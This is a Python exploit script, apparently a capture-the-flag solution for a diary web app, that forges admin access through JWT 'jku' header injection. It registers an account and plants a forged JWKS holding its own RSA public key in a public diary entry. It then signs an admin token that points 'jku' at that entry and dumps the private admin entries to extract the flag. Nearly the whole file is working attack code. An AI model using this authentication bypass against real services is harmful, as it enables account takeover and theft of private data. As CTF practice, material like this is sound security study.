import json
import requests

from jose import jwt  # pip install python-jose
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
from base64 import urlsafe_b64encode

# IMPORTANT, DON'T CHANGE! MODIFY YOUR HOSTS-FILE INSTEAD
base_url = "http://dear-diary.hkn/api"

print("[*] Finding admin id")
admin_id = None
entries = requests.get(f"{base_url}/entries").json()
admin_id = entries[0]["author_id"]
print(f"[+] Admin id found ({admin_id})\n")


print("[*] Creating account")
username = "user"
password = "password"
print(f"      username: {username}")
print(f"      password: {password}")
requests.post(f"{base_url}/users", json={"username": username, "password": password})
print("[+] Account created\n")

print("[*] Logging in")
res = requests.post(f"{base_url}/login", json={"username": username, "password": password})
token = res.json()["access_token"]
print(f"[+] JWT received ({token})\n")

print("[*] Creating RSA keypair")
keypair = RSA.generate(2048)
public_key = keypair.public_key()
private_key = keypair.export_key()
print("[+] Keypair created\n")

print("[*] Fetching server JWKS")
jwks = requests.get(f"{base_url}/keys").json()
print(f"[+] Got server JWKS ({jwks})\n")

print("[*] Modifying JWK to use our public key values")
jwks["keys"][0]["e"] = urlsafe_b64encode(long_to_bytes(public_key.e)).decode()
jwks["keys"][0]["n"] = urlsafe_b64encode(long_to_bytes(public_key.n)).decode()
print(f"[+] JWKS created with custom JWK ({jwks})\n")

print(f"[*] Creating JWK diary entry")
res = requests.post(f"{base_url}/entries", json={"title": "Custom JWKS", "content": json.dumps(jwks), "is_public": True}, headers={"Authorization": f"Bearer {token}"})
entry_id = res.json()["id"]
print(f"[+] Entry creation successful, id: ({entry_id})\n")


print("[*] Creating JWT with JKU set to inserted JWK diary entry")
admin_token = jwt.encode(
    { "user_id": admin_id },
    private_key,
    algorithm="RS256", 
    headers={
        "jku": f"{base_url}/entries/{entry_id}",
        "kid": jwks["keys"][0]["kid"]  # use same KID as in generated JWK
    }
)
print(f"[+] JWT created ({admin_token})\n")


print("[*] Getting all admin entries")
res = requests.get(f"{base_url}/entries", headers={"Authorization": f"Bearer {admin_token}"})
print("[+] Admin entries retrieved\n")


print("[*] Printing private admin entries")
flag = None
for entry in res.json():
    if entry["is_public"]:
        continue
    print("[+]")
    print("=" * 100)
    print(entry["title"])
    print("-" * 100)
    print(entry["content"])
    print("=" * 100)
    print()
    if entry["author_id"] == admin_id and "DDC" in entry["content"]:
        flag = entry["content"]

print("[*] Extracting flag from entries")
print(f"[+] {flag}")
